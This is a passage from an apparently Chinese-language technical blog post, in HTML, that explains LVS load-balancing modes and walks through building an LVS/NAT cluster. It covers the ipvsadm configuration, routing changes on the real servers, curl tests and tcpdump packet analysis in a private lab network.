server&#x53EF;&#x4EE5;&#x5728;&#x4EFB;&#x4F55;LAN&#x6216;WAN&#x4E0A;&#x8FD0;&#x884C;&#xFF0C;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x5141;&#x8BB8;&#x5730;&#x7406;&#x4E0A;&#x7684;&#x5206;&#x5E03;&#xFF0C;&#x8FD9;&#x5728;&#x707E;&#x96BE;&#x6062;&#x590D;&#x4E2D;&#x6709;&#x91CD;&#x8981;&#x610F;&#x4E49;&#x3002;&#x670D;&#x52A1;&#x5668;&#x5FC5;&#x987B;&#x62E5;&#x6709;&#x6B63;&#x5F0F;&#x7684;IP&#x5730;&#x5740;&#x7528;&#x4E8E;&#x4E0E;&#x5BA2;&#x6237;&#x673A;&#x76F4;&#x63A5;&#x901A;&#x4FE1;&#xFF0C;&#x5E76;&#x4E14;&#x6240;&#x6709;&#x670D;&#x52A1;&#x5668;&#x5FC5;&#x987B;&#x652F;&#x6301;IP&#x96A7;&#x9053;&#x534F;&#x8BAE;&#x3002;</p><p><strong>Direct Routing(&#x76F4;&#x63A5;&#x8DEF;&#x7531;)</strong><br>&#x4E0E;IP Tunneling&#x7C7B;&#x4F3C;&#xFF0C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x5668;&#x4EC5;&#x5904;&#x7406;&#x4E00;&#x534A;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x907F;&#x514D;&#x4E86;&#x65B0;&#x7684;&#x6027;&#x80FD;&#x74F6;&#x9888;&#xFF0C;&#x540C;&#x6837;&#x589E;&#x52A0;&#x4E86;&#x7CFB;&#x7EDF;&#x7684;&#x53EF;&#x4F38;&#x7F29;&#x6027;&#x3002;Direct Routing&#x4E0E;IP Tunneling&#x76F8;&#x6BD4;&#xFF0C;&#x6CA1;&#x6709;IP&#x5C01;&#x88C5;&#x7684;&#x5F00;&#x9500;&#xFF0C;&#x4F46;&#x7531;&#x4E8E;&#x91C7;&#x7528;&#x7269;&#x7406;&#x5C42;&#xFF08;&#x4FEE;&#x6539;MAC&#x5730;&#x5740;&#xFF09;&#x6280;&#x672F;&#xFF0C;&#x6240;&#x6709;&#x670D;&#x52A1;&#x5668;&#x90FD;&#x5FC5;&#x987B;&#x5728;&#x4E00;&#x4E2A;&#x7269;&#x7406;&#x7F51;&#x6BB5;&#x3002;</p><h3 id="LVS-NAT&#x6A21;&#x5F0F;&#x5DE5;&#x4F5C;&#x539F;&#x7406;"><a href="#LVS-NAT&#x6A21;&#x5F0F;&#x5DE5;&#x4F5C;&#x539F;&#x7406;" class="headerlink" title="LVS/NAT&#x6A21;&#x5F0F;&#x5DE5;&#x4F5C;&#x539F;&#x7406;"></a>LVS/NAT&#x6A21;&#x5F0F;&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h3><p>&#x5BA2;&#x6237;&#x7AEF;&#x8BBF;&#x95EE;&#x8C03;&#x5EA6;&#x5668;&#x65F6;&#xFF0C;&#x8C03;&#x5EA6;&#x5668;&#x901A;&#x8FC7;&#x7F51;&#x7EDC;&#x5730;&#x5740;&#x8F6C;&#x6362;&#xFF0C;&#x8C03;&#x5EA6;&#x5668;&#x91CD;&#x5199;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x7684;&#x76EE;&#x6807;&#x5730;&#x5740;&#xFF0C;&#x6839;&#x636E;&#x9884;&#x8BBE;&#x7684;&#x8C03;&#x5EA6;&#x7B97;&#x6CD5;&#xFF0C;&#x5C06;&#x8BF7;&#x6C42;&#x5206;&#x6D3E;&#x7ED9;&#x540E;&#x7AEF;&#x7684;&#x771F;&#x5B9E;&#x670D;&#x52A1;&#x5668;&#xFF1B;&#x771F;&#x5B9E;&#x670D;&#x52A1;&#x5668;&#x7684;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x901A;&#x8FC7;&#x8C03;&#x5EA6;&#x5668;&#x65F6;&#xFF0C;&#x62A5;&#x6587;&#x7684;&#x6E90;&#x5730;&#x5740;&#x88AB;&#x91CD;&#x5199;&#xFF0C;&#x518D;&#x8FD4;&#x56DE;&#x7ED9;&#x5BA2;&#x6237;&#xFF0C;&#x5B8C;&#x6210;&#x6574;&#x4E2A;&#x8D1F;&#x8F7D;&#x8C03;&#x5EA6;&#x8FC7;&#x7A0B;&#x3002; </p><p>&#x6B65;&#x9AA4;1&#xFF1A;<br><img src="http://192.168.84.188:8081/uploads/1654756352554241529lvsnat.png" alt=""><br>&#x56FE;&#x4E0A;&#x5404;IP&#x6CE8;&#x89E3;&#xFF1A;  </p><ul><li>CIP  &#x5BA2;&#x6237;&#x7AEF;&#x7684;IP</li><li>VIP  &#x662F;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x7684;IP, &#x662F;&#x96C6;&#x7FA4;&#x5BF9;&#x5916;&#x7684;&#x516C;&#x7F51;IP</li><li>DIP  &#x7528;&#x6765;&#x548C;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x4EA4;&#x4E92;&#x7684;IP, &#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x8F6C;&#x53D1;&#x7ED9;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x4ECE;&#x6B64;&#x53E3;&#x51FA;&#x53BB;</li><li>RIP  &#x771F;&#x5B9E;&#x670D;&#x52A1;&#x5668;&#x7684;IP</li></ul><p>&#x6B65;&#x9AA4;2&#xFF1A;<br>&#x5BA2;&#x6237;&#x7AEF;&#x8BBF;&#x95EE;&#x8C03;&#x5EA6;&#x5668;&#x65F6;&#xFF0C;&#x8C03;&#x5EA6;&#x5668;&#x901A;&#x8FC7;&#x7F51;&#x7EDC;&#x5730;&#x5740;&#x8F6C;&#x6362;&#xFF0C;&#x8C03;&#x5EA6;&#x5668;&#x91CD;&#x5199;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x7684;&#x76EE;&#x6807;&#x5730;&#x5740;&#xFF0C;&#x6839;&#x636E;&#x9884;&#x8BBE;&#x7684;&#x8C03;&#x5EA6;&#x7B97;&#x6CD5;&#xFF0C;&#x5C06;&#x8BF7;&#x6C42;&#x5206;&#x6D3E;&#x7ED9;&#x540E;&#x7AEF;&#x7684;&#x771F;&#x5B9E;&#x670D;&#x52A1;&#x5668;&#xFF1B;<br><img src="http://192.168.84.188:8081/uploads/165477192476265427vsnatstep2.png" alt=""></p><p>&#x6B65;&#x9AA4;3&#xFF1A;<br>&#x771F;&#x5B9E;&#x670D;&#x52A1;&#x5668;&#x7684;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x901A;&#x8FC7;&#x8C03;&#x5EA6;&#x5668;&#x65F6;&#xFF0C;&#x62A5;&#x6587;&#x7684;&#x6E90;&#x5730;&#x5740;&#x88AB;&#x91CD;&#x5199;&#xFF0C;&#x518D;&#x8FD4;&#x56DE;&#x7ED9;&#x5BA2;&#x6237;&#xFF0C;&#x5B8C;&#x6210;&#x6574;&#x4E2A;&#x8D1F;&#x8F7D;&#x8C03;&#x5EA6;&#x8FC7;&#x7A0B;&#x3002;<br><img src="http://192.168.84.188:8081/uploads/1654772032835352084vsnatstep3.png" alt=""></p><p>&#x6B65;&#x9AA4;&#x603B;&#x7ED3;&#x53CA;&#x8FC7;&#x7A0B;&#x5730;&#x5740;&#x53D8;&#x5316;&#xFF1A; </p><ul><li>1: &#x5BA2;&#x6237;&#x7AEF;&#x8BF7;&#x6C42;&#x8BBF;&#x95EE;<a href="http://www.example.com[www.example.com" target="_blank" rel="noopener">www.example.com[www.example.com</a>  ===&gt;  VIP]<br>  &#x6E90;&#x5730;&#x5740;: CIP   &#x76EE;&#x6807;&#x5730;&#x5740;: VIP</li><li>2: &#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x5230;&#x8FBE;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x5668;<br>  &#x6E90;&#x5730;&#x5740;: CIP   &#x76EE;&#x6807;&#x5730;&#x5740;: RIP</li><li>3: RealServer&#x6536;&#x5230;&#x62A5;&#x6587;&#x5904;&#x7406;, &#x54CD;&#x5E94;<br>  &#x6E90;&#x5730;&#x5740;: RIP               &#x76EE;&#x6807;&#x5730;&#x5740;: CIP</li><li>4: &#x8D1F;&#x8F7D;&#x8C03;&#x5EA6;&#x5668;&#x6536;&#x5230;&#x62A5;&#x6587;, &#x6839;&#x636E;&#x81EA;&#x8EAB;&#x4E4B;&#x524D;&#x7684;&#x8F6C;&#x53D1;&#x4FEE;&#x6539;&#x8BB0;&#x5F55;, &#x8FD8;&#x539F;&#x62A5;&#x6587;<br>  &#x6E90;&#x5730;&#x5740;: VIP               &#x76EE;&#x6807;&#x5730;&#x5740;: CIP</li></ul><h2 id="&#x4F7F;&#x7528;LVS-NAT&#x642D;&#x5EFA;&#x96C6;&#x7FA4;"><a href="#&#x4F7F;&#x7528;LVS-NAT&#x642D;&#x5EFA;&#x96C6;&#x7FA4;" class="headerlink" title="&#x4F7F;&#x7528;LVS-NAT&#x642D;&#x5EFA;&#x96C6;&#x7FA4;"></a>&#x4F7F;&#x7528;LVS-NAT&#x642D;&#x5EFA;&#x96C6;&#x7FA4;</h2><p><img src="http://192.168.84.188:8081/uploads/16547724407921088vsnatevn.png" alt=""></p><p><strong>Real Server-1</strong><br>RIP&#xFF1A;<code>192.168.110.11</code><br>DG&#xFF1A;<code>192.168.110.13</code></p><p><strong>Real Server-2</strong><br>RIP<code>192.168.110.12</code><br>DG<code>192.168.110.13</code></p><p><strong>Director</strong><br>DIP<code>192.168.110.13</code><br>VIP<code>192.168.73.13</code></p><h3 id="&#x914D;&#x7F6E;Director&#x5206;&#x53D1;&#x5668;"><a href="#&#x914D;&#x7F6E;Director&#x5206;&#x53D1;&#x5668;" class="headerlink" title="&#x914D;&#x7F6E;Director&#x5206;&#x53D1;&#x5668;"></a>&#x914D;&#x7F6E;Director&#x5206;&#x53D1;&#x5668;</h3><p><strong>&#x5B89;&#x88C5;LVS</strong></p><pre><code>yum install -y lvsadm</code></pre><p><strong>&#x8BBE;&#x7F6E;&#x89C4;&#x5219;</strong></p><pre><code>ipvsadm -A -t 192.168.73.13 -s rr# -A &#x6DFB;&#x52A0;&#x865A;&#x62DF;&#x670D;&#x52A1;&#x5668;# -t &#x8868;&#x793A;TCP&#x534F;&#x8BAE;&#xFF0C;&#x683C;&#x5F0F;&#xFF1A;VIP:port# -s &#x6307;&#x5B9A;&#x8C03;&#x5EA6;&#x7B97;&#x6CD5;# rr&#x8868;&#x793A;round-robin&#x8F6E;&#x8BE2;&#x7B97;&#x6CD5;</code></pre><pre><code class="bash">[root@server13 ~]$ ipvsadm -LnIP Virtual Server version 1.2.1 (size=4096)Prot LocalAddress:Port Scheduler Flags  -&gt; RemoteAddress:Port           Forward Weight ActiveConn InActConnTCP  192.168.73.13:80 rr  -&gt; 192.168.110.11:80            Masq    1      0          0  -&gt; 192.168.110.12:80            Masq    1      0          0[root@server13 ~]$</code></pre><h3 id="&#x914D;&#x7F6E;Real-Server"><a href="#&#x914D;&#x7F6E;Real-Server" class="headerlink" title="&#x914D;&#x7F6E;Real Server"></a>&#x914D;&#x7F6E;Real Server</h3><p><strong>&#x67E5;&#x770B;&#x5206;&#x53D1;&#x5668;&#x7684;&#x7F51;&#x7EDC;&#x4FE1;&#x606F;</strong></p><pre><code>[root@server13 ~]$ ifconfigens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 192.168.110.13  netmask 255.255.255.0  broadcast 192.168.110.255        inet6 fe80::20c:29ff:fe1d:b97c  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:0c:29:1d:b9:7c  txqueuelen 1000  (Ethernet)        RX packets 13359  bytes 5134341 (4.8 MiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 6351  bytes 867941 (847.5 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0ens36: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500        inet 192.168.73.13  netmask 255.255.255.0  broadcast 192.168.73.255        inet6 fe80::20c:29ff:fe1d:b986  prefixlen 64  scopeid 0x20&lt;link&gt;        ether 00:0c:29:1d:b9:86  txqueuelen 1000  (Ethernet)        RX packets 603  bytes 64996 (63.4 KiB)        RX errors 0  dropped 0  overruns 0  frame 0        TX packets 397  bytes 182751 (178.4 KiB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre><p><strong>&#x914D;&#x7F6E;RS1&#x7684;&#x7F51;&#x7EDC;</strong><br>&#x4E3B;&#x8981;&#x628A;Real Server&#x7684;&#x7F51;&#x5173;&#x4FEE;&#x6539;&#x4E3A;&#x5206;&#x53D1;&#x5668;&#x7684;&#x5730;&#x5740;&#xFF1A;</p><pre><code>[root@server11 ~]# route del default gw 192.168.110.1[root@server11 ~]# ip route add default via 192.168.110.13 dev ens33[root@server11 ~]# ip addr show dev ens332: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000    link/ether 00:50:56:27:4b:ff brd ff:ff:ff:ff:ff:ff    inet 192.168.110.11/24 brd 192.168.110.255 scope global ens33       valid_lft forever preferred_lft forever    inet6 fe80::250:56ff:fe27:4bff/64 scope link       valid_lft forever preferred_lft forever[root@server11 ~]# route -nKernel IP routing tableDestination     Gateway         Genmask         Flags Metric Ref    Use Iface0.0.0.0         192.168.110.13  0.0.0.0         UG    0      0        0 ens33169.254.0.0     0.0.0.0         255.255.0.0     U     1002   0        0 ens33192.168.110.0   0.0.0.0         255.255.255.0   U     0      0        0 ens33[root@server11 ~]# hostnameserver11[root@server11 ~]#</code></pre><pre><code>[root@server12 ~]# route del default gw 192.168.110.1[root@server12 ~]# ip route add default via 192.168.110.13 dev ens33[root@server12 ~]# ip addr show dev ens332: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000    link/ether 00:50:56:33:b0:3c brd ff:ff:ff:ff:ff:ff    inet 192.168.110.12/24 brd 192.168.110.255 scope global ens33       valid_lft forever preferred_lft forever    inet6 fe80::250:56ff:fe33:b03c/64 scope link       valid_lft forever preferred_lft forever[root@server12 ~]# route -nKernel IP routing tableDestination     Gateway         Genmask         Flags Metric Ref    Use Iface0.0.0.0         192.168.110.13  0.0.0.0         UG    0      0        0 ens33169.254.0.0     0.0.0.0         255.255.0.0     U     1002   0        0 ens33192.168.110.0   0.0.0.0         255.255.255.0   U     0      0        0 ens33[root@server12 ~]# hostnameserver12[root@server12 ~]#</code></pre><p><strong>&#x5206;&#x522B;&#x5728;Real Server&#x4E0A;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x670D;&#x52A1;</strong>  </p><pre><code class="bash">yum install -y httpd systemctl start httpdip_addr=`ip a | grep &quot;\&lt;inet\&gt;&quot; | grep -v &quot;127.0.0.1&quot; | tr &apos;/&apos; &apos; &apos; | awk &apos;{print $2}&apos; | head -1`echo $ip_addr &gt; /var/www/html/index.html</code></pre><h3 id="&#x6D4B;&#x8BD5;"><a href="#&#x6D4B;&#x8BD5;" class="headerlink" title="&#x6D4B;&#x8BD5;"></a>&#x6D4B;&#x8BD5;</h3><p>&#x4F7F;&#x7528;&#x5BA2;&#x6237;&#x7AEF;&#x8BBF;&#x95EE;VIP&#xFF1A;</p><pre><code>[root@repo_srv ~]# while true;do curl 192.168.73.13;sleep 3;done192.168.110.11192.168.110.12192.168.110.11192.168.110.12192.168.110.11</code></pre><h2 id="&#x6293;&#x5305;&#x5206;&#x6790;"><a href="#&#x6293;&#x5305;&#x5206;&#x6790;" class="headerlink" title="&#x6293;&#x5305;&#x5206;&#x6790;"></a>&#x6293;&#x5305;&#x5206;&#x6790;</h2><blockquote><p>NAT&#x6A21;&#x5F0F;&#x6A21;&#x5F0F;&#x4E2D;&#xFF0C;VIP&#x8FDB;&#x884C;IP&#x7684;&#x8F6C;&#x53D1;&#xFF0C;&#x53EA;&#x6539;&#x53D8;&#x76EE;&#x7684;IP<br>RS1&#x548C;RS2&#x53EA;&#x9700;&#x63D0;&#x4F9B;web&#x670D;&#x52A1;&#xFF08;Nginx&#x548C;httpd&#x90FD;&#x53EF;&#x4EE5;&#xFF09;</p></blockquote><p><strong>&#x8BF7;&#x6C42;&#x6D41;&#x7A0B;</strong>&#xFF1A;  </p><ol><li>&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#x5230;VIP&#x673A;&#x5668;&#x4E0A;&#xFF0C;VIP&#x670D;&#x52A1;&#x5668;&#x6839;&#x636E;LVS&#x7684;&#x7B97;&#x6CD5;&#xFF0C;&#x8F6C;&#x53D1;&#x7ED9;RS&#x670D;&#x52A1;&#x5668;&#xFF08;&#x6539;&#x53D8;&#x76EE;&#x7684;IP&#x4E3A;RS1&#x6216;&#x8005;RS2&#xFF09;&#xFF0C;&#x5E76;&#x8BB0;&#x5F55;&#x8FDE;&#x63A5;&#x4FE1;&#x606F;&#xFF0C;&#x53EA;&#x6539;&#x53D8;&#x76EE;&#x7684;IP&#xFF0C;&#x6E90;IP&#x4E0D;&#x53D8;</li><li>RS&#x6536;&#x5230;request&#x8BF7;&#x6C42;&#x5305;&#x4E4B;&#x540E;&#xFF0C;&#x53D1;&#x73B0;&#x76EE;&#x7684;IP&#x662F;&#x81EA;&#x5DF1;&#x7684;IP&#xFF0C;&#x5904;&#x7406;&#x8BF7;&#x6C42;&#xFF0C;&#x7136;&#x540E;&#x8D70;&#x7F51;&#x5173;&#xFF0C;&#x7ECF;&#x8FC7;VIP</li><li>VIP&#x6536;&#x5230;reply&#x5305;&#x540E;&#xFF0C;&#x4FEE;&#x6539;reply&#x5305;&#x7684;&#x6E90;&#x5730;&#x5740;&#x4E3A;VIP&#xFF0C;&#x53D1;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;</li><li>&#x4ECE;&#x5BA2;&#x6237;&#x7AEF;&#x6765;&#x7684;&#x5C5E;&#x4E8E;&#x672C;&#x5730;&#x8FDE;&#x63A5;&#x7684;&#x5305;&#xFF0C;&#x67E5;hash&#x8868;&#xFF0C;&#x7136;&#x540E;&#x8F6C;&#x53D1;&#x7ED9;RS</li><li>&#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x5B8C;&#x6BD5;&#x540E;&#xFF0C;&#x6B64;&#x6B21;&#x8FDE;&#x63A5;&#x7ED3;&#x675F;&#x6216;&#x8005;&#x8FDE;&#x63A5;&#x8D85;&#x65F6;&#xFF0C;LVS&#x81EA;&#x52A8;&#x4ECE;hash&#x8868;&#x4E2D;&#x5220;&#x9664;&#x6B64;&#x6761;&#x8BB0;&#x5F55;&#x3002;</li></ol><p><strong>&#x5BA2;&#x6237;&#x7AEF;&#x6570;&#x636E;&#x5305;&#x5206;&#x6790;&#xFF1A;</strong></p><blockquote><p>Client IP&#xFF1A;192.168.73.3<br>VIP&#xFF1A;192.168.73.13</p></blockquote><p>&#x5728;&#x5206;&#x53D1;&#x5668;&#x4E0A;&#x6293;&#x5BA2;&#x6237;&#x7AEF;&#x4E0E;VIP&#x7684;&#x5305;&#xFF1A;  </p><pre><code class="bash">[root@server13 ~]$ tcpdump -nn -i ens36 src host 192.168.73.3 and ! port 22 -x -w cip_vip.pcaptcpdump: listening on ens36, link-type EN10MB (Ethernet), capture size 262144 bytes^C6 packets captured6 packets received by filter0 packets dropped by kernel[root@server13 ~]$</code></pre><p>&#x5BA2;&#x6237;&#x7AEF;&#x8BF7;&#x6C42;&#xFF1A;  </p><pre><code>[root@repo_srv ~]# curl 192.168.73.13192.168.110.11[root@repo_srv ~]#</code></pre><p><img src="http://192.168.84.188:8081/uploads/165478377757148493lvsnatciptovip.png" alt=""></p><p><strong>RS&#x6570;&#x636E;&#x5305;&#x5206;&#x6790;&#xFF1A;</strong></p><pre><code class="bash">[root@server13 ~]$ tcpdump -nn -i ens33 dst net 192.168.110.0/24 and ! port 22 -x -w cip_rip.pcaptcpdump: listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes^C6 packets captured6 packets received by filter0 packets dropped by kernel[root@server13 ~]$</code></pre><p>&#x5BA2;&#x6237;&#x7AEF;&#x8BF7;&#x6C42;&#xFF1A;</p><pre><code>[root@repo_srv ~]# curl 192.168.73.13192.168.110.12[root@repo_srv ~]#</code></pre><p><img src="http://192.168.84.188:8081/uploads/1654784508817745874lvsnatciptorip.png" alt=""></p><p><strong>RS&#x54CD;&#x5E94;&#x8BF7;&#x6C42;</strong></p><pre><code class="bash">[root@server13 ~]$ tcpdump -nn -i ens33 dst net 192.168.73.0/24 -x -w rip_cip.pcaptcpdump: listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes^C4 packets captured4 packets received by filter0 packets dropped by kernel[root@server13 ~]$</code></pre><p>&#x5BA2;&#x6237;&#x7AEF;&#x8BF7;&#x6C42;&#xFF1A;</p><pre><code>[root@repo_srv ~]# curl 192.168.73.13192.168.110.11[root@repo_srv ~]#</code></pre><p><img src="http://192.168.84.188:8081/uploads/1654784850262443728lvsnatripreplycip.png" alt=""></p><p>VIP&#x8FD4;&#x56DE;&#x6570;&#x636E;&#x7ED9;&#x5BA2;&#x6237;Client&#xFF0C;&#x5148;&#x4ECE;ens33&#x8FD4;&#x56DE;&#x7ED9;ens36&#xFF0C;&#x5728;&#x4ECE;ens36&#x5C06;&#x6E90;IP&#x6539;&#x6210;VIP&#xFF0C;&#x76EE;&#x6807;IP&#x4FDD;&#x6301;&#x4E0D;&#x53D8;&#xFF1B;</p><pre><code>[root@server13 ~]$ tcpdump -nn -i ens36 dst host 192.168.73.3 and ! port 22tcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on ens36, link-type EN10MB (Ethernet), capture size 262144 bytes06:30:25.983142 IP 192.168.73.13.80 &gt; 192.168.73.3.37938: Flags [S.], seq 460584070, ack 682349952, win 28960, options [mss 1460,sackOK,TS val 114392751 ecr 305917846,nop,wscale 7], length 006:30:25.984589 IP 192.168.73.13.80 &gt; 192.168.73.3.37938: Flags [.], ack 78, win 227, options [nop,nop,TS val 114392753 ecr 305917848], length 006:30:25.984992 IP 192.168.73.13.80 &gt; 192.168.73.3.37938: Flags [P.], seq 1:256, ack 78, win 227, options [nop,nop,TS val 114392753 ecr 305917848], length 255: HTTP: HTTP/1.1 200 OK06:30:25.989453 IP 192.168.73.13.80 &gt; 192.168.73.3.37938: Flags [F.], seq 256, ack 79, win 227, options [nop,nop,TS val 114392757 ecr 305917850], length 006:30:31.001837 ARP, Request who-has 192.168.73.3 tell 192.168.73.13, length 28^C5 packets captured5 packets received by filter0 packets dropped by kernel[root@server13 ~]$</code></pre><p><strong>&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x6293;&#x8BF7;&#x6C42;&#x5305;</strong>  </p><pre><code>[root@repo_srv ~]# tcpdump -nn -i ens33 -x -w client.pcaptcpdump: listening on ens33, link-type EN10MB (Ethernet), capture size 65535 bytes^C13 packets captured13 packets received by filter0 packets dropped by kernel[root@repo_srv ~]#</code></pre><pre><code>[root@repo_srv ~]# elinks --dump 192.168.73.13192.168.110.11</code></pre><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x5305;&#x90FD;&#x662F;&#x4ECE;VIP&#x8FD4;&#x56DE;&#x7684;<br><img src="http://192.168.84.188:8081/uploads/1654821585159424629lvsnatclient.png" alt=""></p><p><strong>&#x5728;RS&#x4E0A;&#x8FDB;&#x884C;&#x6293;&#x5305;&#xFF1A;</strong><br>&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#xFF1A;</p><pre><code>[root@repo_srv ~]# curl 192.168.73.13192.168.110.11[root@repo_srv ~]#</code></pre><p>&#x5206;&#x522B;&#x5728;RS1&#x548C;RS1&#x4E0A;&#x540C;&#x65F6;&#x8FDB;&#x884C;&#x6293;&#x5305;<br>RS1:</p><pre><code>[root@server11 ~]# tcpdump -nn -i ens33 ! port 22tcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes16:43:33.045660 IP 192.168.73.3.37944 &gt; 192.168.110.11.80: Flags [S], seq 2727825376, win 29200, options [mss 1460,sackOK,TS val 342700610 ecr 0,nop,wscale 7], length 016:43:33.045685 IP 192.168.110.11.80 &gt; 192.168.73.3.37944: Flags [S.], seq 1961300035, ack 2727825377, win 28960, options [mss 1460,sackOK,TS val 151171847 ecr 342700610,nop,wscale 7], length 016:43:33.046498 IP 192.168.73.3.37944 &gt; 192.168.110.11.80: Flags [.], ack 1, win 229, options [nop,nop,TS val 342700611 ecr 151171847], length 016:43:33.046910 IP 192.168.73.3.37944 &gt; 192.168.110.11.80: Flags [P.], seq 1:78, ack 1, win 229, options [nop,nop,TS val 342700612 ecr 151171847], length 77: HTTP: GET / HTTP/1.116:43:33.046939 IP 192.168.110.11.80 &gt; 192.168.73.3.37944: Flags [.], ack 78, win 227, options [nop,nop,TS val 151171848 ecr 342700612], length 016:43:33.048466 IP 192.168.110.11.80 &gt; 192.168.73.3.37944: Flags [P.], seq 1:256, ack 78, win 227, options [nop,nop,TS val 151171849 ecr 342700612], length 255: HTTP: HTTP/1.1 200 OK16:43:33.049882 IP 192.168.73.3.37944 &gt; 192.168.110.11.80: Flags [.], ack 256, win 237, options [nop,nop,TS val 342700615 ecr 151171849], length 016:43:33.050306 IP 192.168.73.3.37944 &gt; 192.168.110.11.80: Flags [F.], seq 78, ack 256, win 237, options [nop,nop,TS val 342700615 ecr 151171849], length 016:43:33.050383 IP 192.168.110.11.80 &gt; 192.168.73.3.37944: Flags [F.], seq 256, ack 79, win 227, options [nop,nop,TS val 151171851 ecr 342700615], length 016:43:33.051124 IP 192.168.73.3.37944 &gt; 192.168.110.11.80: Flags [.], ack 257, win 237, options [nop,nop,TS val 342700616 ecr 151171851], length 016:43:38.053106 ARP, Request who-has 192.168.110.11 tell 192.168.110.13, length 4616:43:38.053123 ARP, Reply 192.168.110.11 is-at 00:50:56:27:4b:ff, length 28^C12 packets captured12 packets received by filter0 packets dropped by kernel[root@server11 ~]#</code></pre><p>RS2:</p><pre><code>[root@server12 ~]# tcpdump -nn -i ens33 ! port 22tcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes16:43:32.773388 IP 192.168.73.3.37944 &gt; 192.168.110.11.80: Flags [S], seq 2727825376, win 29200, options [mss 1460,sackOK,TS val 342700610 ecr 0,nop,wscale 7], length 016:43:32.773631 IP 192.168.110.11.80 &gt; 192.168.73.3.37944: Flags [S.], seq 1961300035, ack 2727825377, win 28960, options [mss 1460,sackOK,TS val 151171847 ecr 342700610,nop,wscale 7], length 016:43:32.774272 IP 192.168.73.3.37944 &gt; 192.168.110.11.80: Flags [.], ack 1, win 229, options [nop,nop,TS val 342700611 ecr 151171847], length 016:43:32.774500 IP 192.168.73.3.37944 &gt; 192.168.110.11.80: Flags [P.], seq 1:78, ack 1, win 229, options [nop,nop,TS val 342700612 ecr 151171847], length 77: HTTP: GET / HTTP/1.116:43:32.775234 IP 192.168.110.11.80 &gt; 192.168.73.3.37944: Flags [.], ack 78, win 227, options [nop,nop,TS val 151171848 ecr 342700612], length 016:43:32.776336 IP 192.168.110.11.80 &gt; 192.168.73.3.37944: Flags [P.], seq 1:256, ack 78, win 227, options [nop,nop,TS val 151171849 ecr 342700612], length 255: HTTP: HTTP/1.1 200 OK16:43:32.777607 IP 192.168.73.3.37944 &gt; 192.168.110.11.80: Flags [.], ack 256, win 237, options [nop,nop,TS val 342700615 ecr 151171849], length 016:43:32.778110 IP 192.168.73.3.37944 &gt; 192.168.110.11.80: Flags [F.], seq 78, ack 256, win 237, options [nop,nop,TS val 342700615 ecr 151171849], length 016:43:32.778215 IP 192.168.110.11.80 &gt; 192.168.73.3.37944: Flags [F.], seq 256, ack 79, win 227, options [nop,nop,TS val 151171851 ecr 342700615], length 016:43:32.778961 IP 192.168.73.3.37944 &gt; 192.168.110.11.80: Flags [.], ack 257, win 237, options [nop,nop,TS val 342700616 ecr 151171851], length 016:43:37.780838 ARP, Request who-has 192.168.110.11 tell 192.168.110.13, length 4616:43:37.781090 ARP, Reply 192.168.110.11 is-at 00:50:56:27:4b:ff, length 46^C12 packets captured12 packets received by filter0 packets dropped by kernel[root@server12 ~]#</code></pre><h2 id="&#x6269;&#x5C55;&#xFF1A;bash"><a href="#&#x6269;&#x5C55;&#xFF1A;bash" class="headerlink" title="&#x6269;&#x5C55;&#xFF1A;bash"></a>&#x6269;&#x5C55;&#xFF1A;bash</h2><pre><code class="bash">#!/bin/bash# Enable routing forwardecho &quot;net.ipv4.ip_forward=1&quot; &gt;&gt; /etc/sysctl.confsysctl -p# Install LVS toolsyum install -y ipvsadm# Add Virtual Server ipvsadm -A -t 192.168.73.13:80 -s rr# -A &#x6DFB;&#x52A0;&#x865A;&#x62DF;&#x670D;&#x52A1;&#x5668;# -t TCP# -s &#x8C03;&#x5EA6;&#x7B97;&#x6CD5;,rr(round-robin&#x8F6E;&#x8BE2;&#x66FF;&#x6362;ipvsadm -a -t 192.168.73.13:80 -r 192.168.110.11 -mipvsadm -a -t 192.168.73.13:80 -r 192.168.110.12 -m# -a &#x6DFB;&#x52A0;RS&#x670D;&#x52A1;&#x5668;IP# -r &#x6307;&#x5B9A;RS&#x670D;&#x52A1;&#x5668;IP# -m &#x8868;&#x793A;masquerade# &#x67E5;&#x770B;IPVS&#x8868;ipvsadm -L -n# save rulesipvsadm --save &gt; /etc/sysconfig/ipvsadm# 